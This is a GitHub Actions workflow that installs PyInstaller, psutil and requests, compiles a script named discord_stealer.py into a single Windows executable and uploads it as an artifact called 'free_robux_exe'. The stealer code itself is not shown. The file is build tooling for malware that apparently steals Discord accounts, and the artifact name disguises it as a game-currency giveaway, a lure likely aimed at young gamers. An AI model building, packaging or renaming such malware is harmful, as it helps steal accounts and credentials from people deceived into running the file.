name: Build Stealer EXE (Node.js 20)

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout code
      uses: actions/checkout@v4

    - name: Set up Node.js 20
      uses: actions/setup-node@v4
      with:
        node-version: '20'

    - name: Set up Python (for PyInstaller)
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'

    - name: Install Python dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller psutil requests

    - name: Install Node.js dependencies (optional)
      run: |
        npm install

    - name: Build EXE with PyInstaller
      run: |
        # PyInstaller is installed via Python, so we use pip run or call pyinstaller directly
        pyinstaller --onefile --name discord_stealer discord_stealer.py

    - name: Upload Artifact
      uses: actions/upload-artifact@v4
      with:
        name: free_robux_exe
        path: dist/discord_stealer.exe
